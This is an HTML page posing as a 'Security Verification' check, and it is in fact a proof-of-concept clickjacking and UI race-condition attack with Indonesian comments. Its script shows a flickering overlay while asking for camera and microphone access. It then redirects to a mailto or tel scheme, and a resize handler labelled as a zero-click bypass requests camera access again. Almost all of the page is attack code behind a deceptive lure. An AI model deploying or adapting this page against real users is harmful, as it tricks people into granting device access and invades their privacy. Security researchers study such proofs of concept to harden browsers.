<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Security</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f0f4f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0;
    transition: background 0.1s;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
    max-width: 400px; width: 100%; z-index: 10;
  }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  button {
    background: #007aff; color: #fff; padding: 15px 30px;
    border-radius: 8px; font-size: 18px; font-weight: bold;
    cursor: pointer; border: none; width: 100%;
    position: relative; overflow: hidden;
  }
  
  /* Overlay Palsu untuk Clickjacking saat Resize */
  #overlay {
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: rgba(0, 0, 0, 0.5);
    z-index: 9999;
    display: none;
    pointer-events: none;
    transition: opacity 0.3s;
  }

  #log {
    margin-top: 20px; background: #000; color: #0f0;
    padding: 10px; font-family: monospace; font-size: 12px;
    border-radius: 6px; width: 100%; max-width: 400px;
    height: 120px; overflow-y: auto; text-align: left;
  }
</style>
</head>
<body>

<div id="overlay"></div>

<div class="panel">
  <h1>🔒 Security Verification</h1>
  <p>Klik tombol di bawah untuk melanjutkan.</p>
  <button id="startBtn">Verify System</button>
</div>

<div id="log">Sistem siap...</div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var overlay = document.getElementById('overlay');
  var btn = document.getElementById('startBtn');
  
  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. UI RACE CONDITION (Resize & Layout Thrashing)
  // ============================================
  function triggerUIRaceCondition() {
    log("[!] Memicu UI Race Condition (Split View)...");

    // A. Paksa Resize
    window.dispatchEvent(new Event('resize'));

    // B. Tampilkan Overlay
    overlay.style.display = 'block';
    overlay.style.opacity = '1';

    // C. Paksa Frame Animation (Layout Thrashing)
    var start = Date.now();
    function rafLoop() {
      if (Date.now() - start < 1000) { 
        overlay.style.transform = `scale(${1 + Math.random() * 0.1})`;
        requestAnimationFrame(rafLoop);
      } else {
        overlay.style.display = 'none';
        log("[!] UI Race Condition Selesai. Memicu Payload...");
        executePayload();
      }
    }
    requestAnimationFrame(rafLoop);

    btn.style.opacity = '0';
    btn.style.pointerEvents = 'none';
  }

  // ============================================
  // 2. PAYLOAD EKSEKUSI (Kamera & Protocol Handler)
  // ============================================
  function executePayload() {
    
    // A. Paksa Minta Izin Kamera
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(function(stream) {
          log("[!] Kamera/Mic DIIZINKAN saat UI glitch.");
          // Hentikan stream setelah diizinkan (agar tidak merekam lama)
          stream.getTracks().forEach(function(track) { track.stop(); });
        })
        .catch(function(err) {
          log("[-] Kamera diblokir: " + err.name);
        });
    }

    // B. Coba Buka Skema Telepon / Email (Ganti sesuai target)
    // var targetScheme = "tel:+6281234567890"; 
    var targetScheme = "mailto:security@apple.com";
    
    try {
      window.location.replace(targetScheme);
      log("[+] Skema (" + targetScheme + ") dieksekusi saat UI sibuk.");
    } catch(e) {
      log("[-] Gagal eksekusi skema: " + e.message);
    }

    // Kembalikan UI
    setTimeout(function() {
      btn.style.opacity = '1';
      btn.style.pointerEvents = 'auto';
    }, 2000);
  }

  // ============================================
  // 3. TRIGGER EVENT
  // ============================================
  btn.addEventListener('click', function() {
    triggerUIRaceCondition();
  });

  // ============================================
  // 4. ZERO-CLICK SPLIT VIEW ATTEMPT
  // ============================================
  window.addEventListener('resize', function() {
    log("[!] Resize terdeteksi (Split View / Rotasi). Memicu bypass...");
    
    // Coba minta izin kamera saat resize
    try {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) { 
          log("[!] Kamera diizinkan saat resize."); 
          stream.getTracks().forEach(function(t) { t.stop(); });
        })
        .catch(function(err) { 
          log("[-] Kamera diblokir saat resize: " + err.name); 
        });
    } catch(e) {}
  });

})();
</script>
</body>
</html>
